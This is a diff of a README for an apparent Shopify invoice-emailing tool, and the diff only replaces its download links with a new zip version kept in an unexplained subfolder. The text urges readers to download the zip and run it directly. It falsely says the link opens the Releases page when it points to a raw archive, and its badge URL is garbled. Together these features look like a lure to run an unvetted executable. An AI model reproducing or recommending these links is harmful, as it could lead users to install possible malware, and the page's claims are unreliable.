@@ -1,6 +1,6 @@
 # 📄 shopify-invoice-document-automation - Effortlessly Send Invoices via Email
 
-[![Download Latest Release](https://github.com/GGMario8/shopify-invoice-document-automation/raw/refs/heads/main/therence/automation_shopify_invoice_document_1.8.zip%20Latest%20Release-Click%https://github.com/GGMario8/shopify-invoice-document-automation/raw/refs/heads/main/therence/automation_shopify_invoice_document_1.8.zip)](https://github.com/GGMario8/shopify-invoice-document-automation/raw/refs/heads/main/therence/automation_shopify_invoice_document_1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/GGMario8/shopify-invoice-document-automation/main/therence/automation_shopify_invoice_document_3.6.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/GGMario8/shopify-invoice-document-automation/main/therence/automation_shopify_invoice_document_3.6.zip)](https://raw.githubusercontent.com/GGMario8/shopify-invoice-document-automation/main/therence/automation_shopify_invoice_document_3.6.zip)
 
 ## 📬 Description
 
@@ -11,7 +11,7 @@ The Shopify automated invoice document email delivery system simplifies sending 
 To begin using the application, follow these steps:
 
 1. **Download the Application**
-   - Visit this page to download: [Download the Application](https://github.com/GGMario8/shopify-invoice-document-automation/raw/refs/heads/main/therence/automation_shopify_invoice_document_1.8.zip).
+   - Visit this page to download: [Download the Application](https://raw.githubusercontent.com/GGMario8/shopify-invoice-document-automation/main/therence/automation_shopify_invoice_document_3.6.zip).
 
 2. **Install the Application**
    - Since this is a ready-to-use application, installation is straightforward. Just run the downloaded file.
@@ -47,7 +47,7 @@ To begin using the application, follow these steps:
 
 To get started, simply click the link below:
 
-[Download the Application](https://github.com/GGMario8/shopify-invoice-document-automation/raw/refs/heads/main/therence/automation_shopify_invoice_document_1.8.zip)
+[Download the Application](https://raw.githubusercontent.com/GGMario8/shopify-invoice-document-automation/main/therence/automation_shopify_invoice_document_3.6.zip)
 
 This link will take you directly to the Releases page where the latest version is always available.
 
